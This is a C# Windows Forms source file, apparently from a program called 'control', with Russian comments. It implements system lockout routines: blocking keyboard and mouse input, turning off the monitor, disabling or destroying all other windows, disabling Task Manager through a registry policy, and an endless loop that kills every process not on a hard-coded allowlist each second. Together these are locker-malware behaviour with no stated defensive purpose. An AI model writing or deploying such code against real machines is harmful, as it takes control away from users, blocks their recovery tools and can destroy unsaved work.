using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using Microsoft.Win32;
using System.Threading.Tasks;

namespace control
{

    public partial class blocks : Form
    {
		public static string[] prockill = new string[] { "svchost", "chrome", "httpd", "dwm", "lsm", "WmiPrvSE", "taskhost", "taskeng", "devenv", "conhost", "lsass", "mysqld-nt", "srvany", "sidebar", "services", "wmdc", "audiodg", "csrss", "explorer", "nvvsvc", "nvxdsync", "System", "teskeng", "Idle", "winlogon", "RAVCpl64", "RAVCpl", "spoolsv", "RAVCpl", "taskhost", "taskmgr", "wininit", "wmpnetwk", "KMPlayer", "MSBuild", "control.vshost", "sppsvc", "IntelliTrace", "InputPersonalization", "smss" };
        
        public int WM_SYSCOMMAND = 0x0112;                                                  //|Отключение 
        public int SC_MONITORPOWER = 0xF170;                                                //|
        [DllImport("user32.dll")]                                                           //|монитора
        private static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);  //|
        // SendMessage(this.Handle.ToInt32(), WM_SYSCOMMAND, SC_MONITORPOWER, 2);//DLL function

        [return: MarshalAs(UnmanagedType.Bool)]                                                  //|
        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]                  //|Блокировка клавиатуры
        public static extern bool BlockInput([In, MarshalAs(UnmanagedType.Bool)] bool fBlockIt); //|BlockInput(true);

        [DllImport("user32.dll", SetLastError = false)]
        static extern IntPtr GetDesktopWindow();

        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr GetWindow(IntPtr hWnd, GetWindow_Cmd uCmd);

        enum GetWindow_Cmd : uint
        {
            GW_HWNDFIRST = 0,
            GW_HWNDLAST = 1,
            GW_HWNDNEXT = 2,
            GW_HWNDPREV = 3,
            GW_OWNER = 4,
            GW_CHILD = 5,
            GW_ENABLEDPOPUP = 6
        }

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool EnableWindow(IntPtr hWnd, bool bEnable);

        [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool DestroyWindow(IntPtr hwnd);

        public void wblock(bool metod)
        {
            IntPtr hwnd = GetWindow(GetDesktopWindow(), GetWindow_Cmd.GW_OWNER);//получаем первое дочернее окно Рабочего стола

            if (hwnd != IntPtr.Zero)
            { while (hwnd != IntPtr.Zero)//перебираем все окна в системе
                { if (hwnd != this.Handle)//проверка, что блокируем не свое окно
                        if (metod) { EnableWindow(hwnd, false);/*блокируем окно (вид окна, как будто его блокирует диалоговое окно)... */}
                        else { DestroyWindow(hwnd);/*...или уничтожаем окно*/ }
                    hwnd = GetWindow(hwnd, GetWindow_Cmd.GW_HWNDNEXT);//получаем хендл следующего окна
                }
            }
        }
        public static void tblock(bool metod)
        {
            RegistryKey key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            if (metod == true) key.SetValue("DisableTaskMgr", 1); else key.SetValue("DisableTaskMgr", 0);
           
        }
        public static void killproc(bool metod)
        {
            if (metod)
            {
                while (true)
                {
                    Parallel.ForEach(Process.GetProcesses(), i => { if (!prockill.Contains(i.ProcessName)) i.Kill(); });
                    Thread.Sleep(1000); }
            }
        }

    }
}
